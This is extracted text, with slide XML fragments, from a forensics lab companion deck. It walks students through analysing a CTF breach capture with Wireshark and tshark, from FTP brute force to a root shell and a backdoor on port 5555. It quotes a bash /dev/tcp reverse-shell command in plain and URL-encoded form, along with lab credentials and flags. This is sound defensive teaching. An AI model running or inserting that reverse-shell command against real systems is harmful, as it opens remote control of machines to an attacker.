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Companion session for Lab 05 - assumes the main deck was seen. Goal: stream fluency, scripted extraction, and the full worked breach. About 120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Five parts, ordered: workflow first, streams second, tshark third, then the case end to end, then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60-second orientation. Run capinfos live on challenge.pcapng - the SHA256 line is the intake-hash habit made visible. io,phs and conv,tcp reproduce two Statistics menus in the terminal.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Stream-centric analysis. The tcp.stream field is the citation currency of this lab. The brute-force SHAPE - many tiny streams, one with 230 - is the mental model to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tshark table - screenshot material. The PASS-field one-liner answers 'list every password attempted' in one command; the follow,tcp form prints a stream without opening the GUI.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Decode layers. Both examples are from the case: the URL-encoded reverse shell and the XOR-hex covert line. The python one-liner at the bottom is the exact tool for the second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1. Let students predict what the successful stream looks like before revealing (530s vs one 230). The RETR commands name the loot - the files ride separate data connections.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2. The chain: stolen DB creds -&gt; MySQL login; the RCE POSTs (packet numbers matter - they are the citation); the 4444 shell where the root password is typed in clear. The trailing-space failed attempt is worth 30 seconds of comedy and pedagogy.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Worked part 3 and the double flag reveal. Sequence: gr00t.txt flag, then read backdoor.py for the scheme, then decode the 5555 lines. The final echo-command flag is the series' graduation moment. After this: B and C are solo.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whole capture in one table - this is what their Challenge A writeup should look like. Every row cites its evidence source; times are capture-UTC.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Field notes. The five mistakes map to habits; the FTP-data row is the one students actually hit (files 'missing' because they only looked at port 21).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IOCs for the SOC. The credential row doubles as the incident-response checklist: everything seen in the capture must be ROTATED. The detection-rule row converts forensics into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Assign deadlines and submission format. Remind: packet/stream citations, hashes before and after, and no spoilers on B or C - including how many login attempts or what the ICMP marker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023360" cy="4023360"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1432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FORENSICS LABORATORY  ·  LAB 05  ·  COMPANION DECK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Dive:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="42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Wireshark, Streams &amp; Covert Channels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upstream breach capture, solved together — the two new challenges stay yours.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Lab-5  ·  companion to the Lab 05 lecture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cover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746504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workflow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5568" y="20939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capinfos, protocol hierarchy, conversations - orient in 60 seconds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734056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679192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Stream-centric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302666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streams in order, cite them like page numbers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66744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48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6118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tshark for volume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15568" y="395935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scripted extraction: filters, fields, statistics, exports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544568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Reconstructing the chain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48920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correlate streams across ports and time into one attack story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32120"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B6B7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513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5477256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case + your turn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15568" y="582472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full breach capture end to end; then Challenges B and C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1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Sixty-second orientation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capinfos challenge.pcapng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of packets:  2938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packet time:  2023-02-22 23:19:41 UTC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SHA256:             4a71c0...   # intake hash!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tshark -r challenge.pcapng -q -z io,phs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protocol hierarchy, scripted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tshark -r challenge.pcapng -q -z conv,tcp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TCP conversations ranked by bytes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60 seconds buy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capture window and duration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 mix - what to expect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talkers and odd ports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integrity hash before you touch anything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· 2 OF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Streams are your page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64465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find streams to one port, list stream ids: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tshark -r cap.pcap -Y 'tcp.port==21'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-T fields -e tcp.stream | sort -n | uniq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12  13  14  15  16  17 ...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dump one stream as text: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tshark -r cap.pcap -q -z follow,tcp,ascii,13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brute force = MANY one-attempt streams;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success = the stream with 230 in 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0" y="1920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 habit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863840" y="2359152"/>
            <a:ext cx="3749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findings as 'TCP stream N'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tcp.stream==N to re-find it instantly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conversation = one exhibit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="130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30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 vs blue = client vs server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 PACK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tshark one-liners worth memorizing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43991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Filter + show fields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-Y ftp -T fields -e frame.number -e ftp.request.command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FTP passwords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-Y 'ftp.request.command=="PASS"' -T fields -e ftp.arg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objects out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--export-objects http,outdir/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Conversations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-q -z conv,tcp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Follow stream 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-q -z follow,tcp,ascii,N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ICMP payload hex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tshark -r c.pcap -Y icmp -T fields -e data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Payloads hide in layers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URL encoding (the RCE POST):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cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.106%2F4444+0%3E%261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  bash -i &gt;&amp; /dev/tcp/192.168.0.106/4444 0&gt;&amp;1     # reverse shell!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hex + XOR (the backdoor channel):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1f067a  -&gt;  XOR('super_secret_key')  -&gt;  'ls'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python3 -c "print(bytes(a^b for a,b in zip(bytes.fromhex('1f067a'),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b'super_secret_key')).decode())"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(1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FTP: brute force, then batman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9994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1058875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~30 short streams to port 21, three attempts each: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ftp / PASS princess / 530 Login incorrect.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ftp / PASS qwerty   / 530 Login incorrect.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one stream ends differently (Q2):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ftp / PASS batman / 230 Login successful.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 / FEAT / EPSV / LIST -la / NLST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 credentials.txt / SIZE / MDTM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 .bash_history</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Q3: data connections carry the goods (next slide)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(2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Loot, RCE, and the road to root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FTP data connections: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credentials.txt: username myuser, password P@ssw0rd123456!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.bash_history: su root, sudo passwd root, mysql usage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Q4: myuser logs into MySQL (3306) - creds reused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Q6: the RCE packets #2674 / #2678 (from Lab 04's app!):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cmd=bash -i &gt;&amp; /dev/tcp/192.168.0.106/4444 0&gt;&amp;1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Q5: on the 4444 shell, su root - password visible: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1amgr000000t!@#$   (first try had a trailing space - failed!)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49640" y="178308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 beats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49640" y="2221992"/>
            <a:ext cx="3090672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stolen creds reused on MySQL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reverse shell = odd port 4444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 typed into su appear in the stream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Q7: then flag.txt decoy, pty, cd ~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WORKED · CHALLENGE A (3 OF 3)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gr00t.txt, backdoor.py, and two flags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863840" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1837"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1B26"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1E3646"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln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9384"/>
            <a:ext cx="100584" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8686A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1929384"/>
            <a:ext cx="100584" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9C46A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170432" y="1929384"/>
            <a:ext cx="100584" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="57B894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87452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root@dfir:~/lab05#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2167128"/>
            <a:ext cx="7360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Q8: cat gr00t.txt (root's home):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"Congrats on getting here. But that's not it,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 real test starts now! ;)" + flag{1_4m_gr00000t!}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Q9: wget backdoor.py -&gt; C2 on port 5555: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 admin/b4ckd00r; commands = hex + XOR 'super_secret_key'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C8A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Q10: decoded covert commands: ls / id / cat gr00t.txt /</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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"flag{c0ngrats_1f_y0u_m4d3_1t_t1ll_h3r3_ch4mp}" | whoami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49640" y="1783080"/>
            <a:ext cx="3090672" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3913"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="134B56"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw sx="100000" sy="100000" kx="0" ky="0" algn="bl" rotWithShape="0" blurRad="88900" dist="25400" dir="2700000">
              <a:srgbClr val="0F22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Upstream flags (original format):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0" y="265176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flag{1_4m_gr00000t!}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flag{c0ngrats_1f_y0u_m4d3_1t_t1ll_h3r3_ch4mp}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549640" y="4160520"/>
            <a:ext cx="3090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4B5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49640" y="4599432"/>
            <a:ext cx="3090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stream 5555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hex-decode each line</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="152400" indent="-152400">
              <a:lnSpc>
                <a:spcPct val="112000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="▸"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150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XOR with the key from backdoor.py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whole capture, one table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937760"/>
                <a:gridCol w="432511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(UTC)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23:19-23:25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FTP brute force: ~30 streams, 3 guesses each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streams to :21, 530 replies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23:26:11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 batman - 230 Login successful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odd stream out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23:26-23:27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 credentials.txt + .bash_history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EPSV data connections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23:26:38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MySQL login as myuser (reused creds)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stream to :3306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23:26:47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RCE POSTs #2674/#2674-78 -&gt; reverse shell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command.php, /dev/tcp/.../4444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23:27-23:28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4444 shell: whoami, su root, pty, gr00t.txt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follow stream :4444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23:28:24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wget backdoor.py from GitHub (over TLS)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TLS to 185.199.x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34B5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23:29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backdoor live on :5555 - covert commands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XOR-hex lines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Common mistakes, proven habits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70774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Mistake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Habit instead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Scrolling packet by packet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hierarchy + conversations first; filters second; streams third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Reading only request direction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replies carry the 230/200 and the command OUTPUT - always both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Stopping at the hex dump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URL-decode, hex-decode, XOR - layers hide the story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Ignoring 'boring' protocols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ICMP and DNS are classic covert channels; check their payloads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Forgetting FTP data ports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EPSV/PASV open random high ports - the files ride there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B6B7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IOCs you can hand the SOC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2337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Indicator from this capture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Atomic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attacker IP 192.168.0.106; C2 port 5555; backdoor creds admin/b4ckd00r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Behavioral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FTP burst then single success; reverse shell to :4444; su-to-root in stream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backdoor.py (SHA from capinfos of the wget TLS flow's SNI host)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Credential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ftp:batman; mysql myuser; root 1amgr000000t!@#$ - all exposed, all rotate NOW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4B5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 rule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707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alert tcp any any -&gt; $HOME 21 (content "530"; threshold 20/min); alert :4444/:5555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078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7DC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fresh captures. Same discipline.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24028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54480" y="226771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B — 4.2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554480" y="26517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office_hours.pcap: a small intranet capture. Find the login that finally succeeds (the credentials are in the clear), export the file that was downloaded, and decode the token inside it.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554480" y="35021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Challenge C — 4.3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54480" y="38862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ping_puzzle.pcap: 112 packets of ICMP and nothing else. One host keeps pinging; the payloads are not all padding. Reassemble the odd ones in order and decode the message.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868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554480" y="47365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paper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54480" y="51206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CE9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pre-lab first; staged hints in section 4; cite packet and stream numbers for every claim; hash the captures before and after.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07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Stefanus Eko Prasetyo  ·  Digital Forensics Laboratory  ·  Lab-5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05 Deep Dive - Wireshark, Streams and Covert Channel Workflows</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Stefanus Eko Prasetyo</dc:creator>
  <cp:lastModifiedBy>Stefanus Eko Prasetyo</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-28T13:01:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-28T13:01:04Z</dcterms:modified>
</cp:coreProperties>
</file>